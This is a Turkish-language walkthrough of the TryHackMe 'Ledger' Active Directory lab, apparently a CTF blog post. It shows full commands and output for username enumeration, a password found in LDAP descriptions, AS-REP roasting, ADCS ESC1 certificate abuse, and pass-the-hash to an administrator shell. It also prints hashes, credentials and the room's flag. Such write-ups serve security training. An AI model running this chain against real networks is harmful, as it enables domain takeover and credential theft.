---

title: THM - Ledger
image: https://tryhackme-images.s3.amazonaws.com/room-icons/78aa83616ded14aad892e05c15cc9eb2.png
author: Acivik
date: 2026-07-02 08:00:00 +0300 
categories: [CTF, TryHackMe]
tags: [tryhackme, ad, active directory, writeup, ctf, walkthrough, windows]

---

# Enumeration
## Nmap
`Nmap` taraması ile sistemi keşfetmeye başlayalım.

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-05-31 19:29:31Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-31T19:31:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
| SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
443/tcp   open  ssl/https?    syn-ack ttl 126
|_ssl-date: 2026-05-31T19:31:35+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:26:00
| Not valid after:  2028-05-12T07:35:59
| MD5:     c249 3bc6 fd31 f2aa 83cb 2774 bc66 9151
| SHA-1:   397a 54df c1ff f9fd 57e4 a944 00e8 cfdb 6e3a 972b
| SHA-256: 6915 c48a f18a bfee e8a2 084f 5088 8358 2582 11b5 f01a 7da0 3443 117b 8cbd 6031
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?  syn-ack ttl 126
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
| SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-31T19:31:35+00:00; -1s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-31T19:31:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
| SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-31T19:31:35+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:labyrinth.thm.local, DNS:thm.local, DNS:THM
| Issuer: commonName=thm-LABYRINTH-CA/domainComponent=thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-12T07:32:36
| Not valid after:  2024-05-11T07:32:36
| MD5:     eae1 9bc6 ffbf ac19 f750 22bd 7186 943a
| SHA-1:   5bd6 40fd 76e2 d5ab 3909 5bcc 7a4f 4f4c f7c6 2e34
| SHA-256: a412 f859 7460 5b99 797f a491 b4cf fefc a5f9 42ef a4a0 a35e 8ef1 d50e 50a5 2956
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Issuer: commonName=labyrinth.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-30T18:17:37
| Not valid after:  2026-11-29T18:17:37
| MD5:     f798 448c 5ec7 a63a dde6 1912 e89d 68e9
| SHA-1:   c8fe 5429 1c63 828b 3c0e c3e5 d8b2 7806 831e f96e
| SHA-256: 9d5a 9ee0 72ef 7609 3a21 b2c4 6acc 421a 0f23 e8b5 f191 6278 cfc1 5229 858c 5adb
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-31T19:31:35+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49808/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12172/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40800/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49578/udp): CLEAN (Timeout)
|   Check 4 (port 4197/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2026-05-31T19:30:31
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:31
Completed NSE at 15:31, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.00 seconds
           Raw packets sent: 30 (1.320KB) | Rcvd: 30 (1.320KB)
                                             
┌──(root㉿kali)-[~/thm/ledger]
└─# 

```
Tarama sonucunda açık olan port ve servisleri incelediğimizde DNS(53), HTTP/S(80,443), kerberos(88), RPC(135), SMB(445), LDAP(389), RDP(3389) gibi servisler açık görünüyor.
- Domain: `thm.local`
- Hostname: `LABYRINTH` / `labyrinth.thm.local`
Bu verileri `/etc/hosts` dosyasına kaydedelim. Ve sırayla güzel bir şekilde servisler hakkında bilgi toplamaya başlayalım.
## HTTPS
![[image-38.png]]
Sertifikayı görüntüledim. CA'nın "thm-LABYRINTH-CA" olduğunu ve bu sistemin sertifika template'lerini yönettiğini görüyoruz. ADCS için bunu bir ipucu olarak not alacağım ve daha sonra tekrar kontrol edeceğim.
## SMB
`guest` erişimi var mı bakalım.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# nxc smb 10.113.165.5 -u 'guest' -p '' --shares              
SMB         10.113.165.5    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.113.165.5    445    LABYRINTH        [+] thm.local\guest: 
SMB         10.113.165.5    445    LABYRINTH        [*] Enumerated shares
SMB         10.113.165.5    445    LABYRINTH        Share           Permissions     Remark
SMB         10.113.165.5    445    LABYRINTH        -----           -----------     ------
SMB         10.113.165.5    445    LABYRINTH        ADMIN$                          Remote Admin
SMB         10.113.165.5    445    LABYRINTH        C$                              Default share
SMB         10.113.165.5    445    LABYRINTH        IPC$            READ            Remote IPC
SMB         10.113.165.5    445    LABYRINTH        NETLOGON                        Logon server share 
SMB         10.113.165.5    445    LABYRINTH        SYSVOL                          Logon server share 
                                                             
┌──(root㉿kali)-[~/thm/ledger]
└─# 

```
Önemli bir paylaşım görünmüyor. SMB üzerinden username'leri toplamak istiyorum.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# nxc smb 10.113.165.5 -u 'guest' -p '' --rid-brute | tee users.txt
SMB                      10.113.165.5    445    LABYRINTH        [*] Windows 10 / Server 2019 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB                      10.113.165.5    445    LABYRINTH        [+] thm.local\guest: 
....
SMB                      10.113.165.5    445    LABYRINTH        1113: THM\greg (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1114: THM\SHANA_FITZGERALD (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1115: THM\CAREY_FIELDS (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1116: THM\DWAYNE_NGUYEN (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1117: THM\BRANDON_PITTMAN (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1118: THM\BRET_DONALDSON (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1119: THM\VAUGHN_MARTIN (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1120: THM\DICK_REEVES (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1121: THM\EVELYN_NEWMAN (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1122: THM\SHERI_DYER (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1123: THM\NUMBERS_BARRETT (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1124: THM\SUSANA_LOWERY (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1125: THM\MIKE_TODD (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1126: THM\JOSEF_MONROE (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1127: THM\DAWN_DAVID (SidTypeUser)
SMB                      10.113.165.5    445    LABYRINTH        1128: THM\VIVIAN_VELAZQUEZ (SidTypeUser)
...
                                                     
┌──(root㉿kali)-[~/thm/ledger]
└─# 
```
Topladığımız username'leri bir dosyaya kaydedeceğim.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# cat users.txt | cut -d '\' -f 2| awk '{print $1}' > usernames.txt
```
489 adet username var. Bunları as-rep roasting için kullanacağım.
## LDAP
Anonim olarak temel DN kullanarak bir LDAP araması denemek istiyorum.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# ldapsearch -x -H ldap://10.114.174.211 -b "DC=thm,DC=local" "(objectClass=user)" description                        
# extended LDIF
#
# LDAPv3
# base <DC=thm,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: description 
#

# Guest, Users, thm.local
dn: CN=Guest,CN=Users,DC=thm,DC=local
description: Tier 1 User

# LABYRINTH, Domain Controllers, thm.local
dn: CN=LABYRINTH,OU=Domain Controllers,DC=thm,DC=local

# Greg, Users, thm.local
dn: CN=Greg,CN=Users,DC=thm,DC=local
description: Tier 1 User

# SHANA_FITZGERALD, OGC, Tier 1, thm.local
dn: CN=SHANA_FITZGERALD,OU=OGC,OU=Tier 1,DC=thm,DC=local

# CAREY_FIELDS, ServiceAccounts, SEC, Tier 1, thm.local
dn: CN=CAREY_FIELDS,OU=ServiceAccounts,OU=SEC,OU=Tier 1,DC=thm,DC=local

# DWAYNE_NGUYEN, T1-Devices, Tier 1, Admin, thm.local
dn: CN=DWAYNE_NGUYEN,OU=T1-Devices,OU=Tier 1,OU=Admin,DC=thm,DC=local
description: Tier 1 User

# BRANDON_PITTMAN, Domain Controllers, thm.local
dn: CN=BRANDON_PITTMAN,OU=Domain Controllers,DC=thm,DC=local
description: Tier 1 User

# BRET_DONALDSON, Groups, FIN, Tier 2, thm.local
dn: CN=BRET_DONALDSON,OU=Groups,OU=FIN,OU=Tier 2,DC=thm,DC=local

# VAUGHN_MARTIN, ServiceAccounts, ITS, Stage, thm.local
dn: CN=VAUGHN_MARTIN,OU=ServiceAccounts,OU=ITS,OU=Stage,DC=thm,DC=local
description: Tier 1 User

# DICK_REEVES, TST, Tier 1, thm.local
dn: CN=DICK_REEVES,OU=TST,OU=Tier 1,DC=thm,DC=local

# EVELYN_NEWMAN, Test, ITS, Stage, thm.local
dn: CN=EVELYN_NEWMAN,OU=Test,OU=ITS,OU=Stage,DC=thm,DC=local
description: Tier 1 User

# SHERI_DYER, GOO, People, thm.local
dn: CN=SHERI_DYER,OU=GOO,OU=People,DC=thm,DC=local
description: Tier 1 User

```
User'lar için description başlığını incelediğimizde 2 kullanıcı için parola bilgisi bulunuyor.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# ldapsearch -x -H ldap://10.114.174.211 -b "DC=thm,DC=local" "(objectClass=user)" description | grep -i "description"
...
description: Tier 1 User
description: Tier 1 User
description: Tier 1 User
description: Tier 1 User
description: Please change it: CHANGEME2023!
description: Tier 1 User
description: Tier 1 User
description: Please change it: CHANGEME2023!
description: Tier 1 User
description: Tier 1 User
...                                       
┌──(root㉿kali)-[~/thm/ledger]
└─# 

```
SMB üzerinden doğrulayalım.
```
SMB         10.113.157.8    445    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023!
SMB         10.113.157.8    445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023!
```
# Foothold
```
┌──(root㉿kali)-[~/thm/ledger]
└─# bloodhound-python -d thm.local -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -ns 10.113.162.161 -c All 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: thm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: labyrinth.thm.local
INFO: Found 493 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 222 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: labyrinth.thm.local
INFO: Done in 00M 25S
                                                             
┌──(root㉿kali)-[~/thm/ledger]
└─# 
```

``IVY_WILLIS`` kullanıcısı RMU ve RDU gruplarına dahil değildi.
![[image-36.png]]
SUSANNA kullanıcısı bahsi geçen gruplara üye olduğu için rdp uygulaması ile bağlanabilirim.

![[image-37.png]]

## AS-REP Roasting
```
┌──(root㉿kali)-[~/thm/ledger]
└─# impacket-GetNPUsers thm.local/ -usersfile usernames.txt -dc-ip 10.113.165.5 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User greg doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SHANA_FITZGERALD doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User CAREY_FIELDS doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DWAYNE_NGUYEN doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:c9da095439789e416a9c33e50f18a090$50182939175e51b5e14e591542045191b43a4cd994bdae3e1917892ca1cad900fa2cd289b60037cda3f65fb4650f452a4c57c0cbb8d1b3887961304e1b3f5dcefedb09fc40e346c63fe01f319ba213a13fd7a957d227da1f27b98704a79d03dfda05f03c7ecc304ee319923e207657b348e362c03961b412282fef889e035b0cda12cfe6b4937fe9e1fe37eb4477d4dc06220055e4b2258cd8d34982ada2d8db4127fa813f15b65814d11f9ed59446622fbf4158c9768bf3522913181fa309131ea690cc9f97ffa1fa596af5e1cedf30808d65e131b9a8a10a1547f9c6d6b642c898510a61b7
...
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:8442f70f598889dce5034cbb7bafbe98$5e59851d7f666cfb8c0c8c651bc01837e7f535ae17d1164b01bcff60ba4d4585d1fa110cd709bb557c83ab2e5943546de934f99684e07e14814bc69e4866cbfb081b8c976e71fedb2c200289f4cbc158a9cff93cb59cc157ae11095a22f629115432f55752c36ae17407ca15749e4c8cc4f179ddc26c4954575df10b9751c859639ea5e70d028c92ba00676f1d70c8249136ab547fadab0180cc0f94c403a412c8fa7f14ae8109b4cf1a3668b92939a9e509047c65c702eab9d9645d67e0dcb2cc21dcea3feadd57fcf060dbff194db7676821c54f2a95f6a7d7e027e22d52e6c74163456cf2
...
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:9aa18487a2822614898679f70af13e39$243c7bc65dae8f2c472824f6a3015d9e9b91041f60af329d4bdceaa19cadd66334387b94460508bf42e9fcb7a67c8ee8a874c9b5b417a074c1a5db4c464218a8c1adc657f124812df66176495e70ee62e7ffd9491fb83439416dfc108b967c25111f02e9f9052c5ed70a1a5d3c992861c1067e9e0c365762b5b2f6b11b3f7f2babc2e723c3490e308f2b46a6c29e64d34ac6b539860937a14d9c02a8bdbdcc0fc42399ae98bb18a6151004de25809252011928f2f80b5005fe7e87c2ba8b407ea8c604fac1065c1198976f80fd14f2ec5a3e4a9c77c4250438a67217857b8ae89ea18acf7a2a
...
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:b4ec4f3ae75d7eb168cf89d344ccd2a8$94503b5567160fcb54942ab43dede009db31c89e2a8b11ffa8c1387688d313cf5fff84d970e20a9615b6bcbfe8a32f87fc02bf5c234929e25d7c8d783b552d50ca51ec3f744e072da058c99bc3d2e749ddad90293ec23a9bddcaa1a9bc48108a162565f4441ce5aa10a4fccb7d8e37262d383b3e31b3c925464981d4be0fd2dd453482d1ff624a8b3074245706036a4ef9f6425e2340c48283785b6a0c355ac81a8c22c8fddf98f8d13044bd9368fbd44dd86529b6c479d97e5cd5b426704e6ff70e2413fbf86ae220e50c03c553e114f20386494114b1349bfda63c0e3785bd64c2cefb86d0
...
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:1495f67fdc4610d7370a6c998e3d2ab6$2c10b8f77ff19dd10729422e300af15bb6370737d6bb316b40ccae60ddeb97a5c582914f8039b41a5b932a36ad859e5603ea9a0f0c85dbfd5baf8f95412a5e1d580e899bdd23821dbcbfb64bcf0d4433bb17ef46de0284678dc1c10243e10134f48a0eed5c20a542279073ab00c191eb37964c1b74f97e1607b15bd4770a3df8bf5c496b4bda0bde3b851633514586fe2d8b9b441b36ceaa8cb8cbb0348463fc50988c162329d5f94bcb3d08d1bae1e6bac766c69c78cc91721f4064dbf5f3f8f74a96a5300a3e35052bd351f411880c11f9119b490f206481d249c74153318d0d71976f7e97
...
                                                           
┌──(root㉿kali)-[~/thm/ledger]
└─#
```
5 tane kullanıcının preauth özelliği kapalı bu sayede hash'lerini alabildik. ``hashcat`` ile kırmayı denedim fakat kırılmadı.
# Privilege Escalation - ESC1

**Active Directory Certificate Services (ADCS)**, dijital sertifikaları yayınlamak, yönetmek ve doğrulamak için bir Public Key Infrastructure (PKI) sağlayan bir Windows Server rolüdür. AD CS, Certificate Authority (CA) olarak görev yaparak dijital sertifikaların kimlik doğrulama, şifreleme ve dijital imzalar gibi çeşitli amaçlarla güvenli dağıtımını ve kullanımını sağlar. Yanlış yapılandırılması ciddi güvenlik sorunlarına yol açabilir.

ADCS'i numaralandırmak ve kötüye kullanmak için Certipy aracını kullanacağız.

```
┌──(root㉿kali)-[~/thm/ledger]
└─# certipy-ad find -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.114.138.30 -vulnerable -text   
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'thm-LABYRINTH-CA' via RRP
[*] Successfully retrieved CA configuration for 'thm-LABYRINTH-CA'
[*] Checking web enrollment for CA 'thm-LABYRINTH-CA' @ 'labyrinth.thm.local'
[*] Saving text output to '20260603023454_Certipy.txt'
[*] Wrote text output to '20260603023454_Certipy.txt'
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/thm/ledger]
└─# cat 20260603023454_Certipy.txt                                                               
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-12T08:55:40+00:00
    Template Last Modified              : 2023-05-12T08:55:40+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Full Control Principals         : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Write Property Enroll           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : THM.LOCAL\Authenticated Users
                                          THM.LOCAL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/thm/ledger]
└─# 
```
ESC1 Zafiyeti görünüyor.
Admin olarak serfika talebinde bulunalım. Authentication sertifikası oluşturulacaktır.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# certipy-ad req -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!' -dc-ip 10.114.138.30 -ca thm-LABYRINTH-CA -template ServerAuth -upn administrator@thm.local
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@thm.local'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/thm/ledger]
└─# 
```
Oluşturulan sertifika ile admin hashini alalım.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# certipy-ad auth -dc-ip 10.114.138.30 -pfx administrator.pfx
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@thm.local'
[*] Using principal: 'administrator@thm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@thm.local': aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/thm/ledger]
└─# 
```
PtH ile admin oturumuna geçebiliriz.
```
┌──(root㉿kali)-[~/thm/ledger]
└─# impacket-wmiexec thm.local/Administrator@labyrinth.thm.local -hashes ':07d677a6cf40925beb80ad6428752322' -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
THM{THE_BYPASS_IS_CERTIFIED!}
C:\>
```
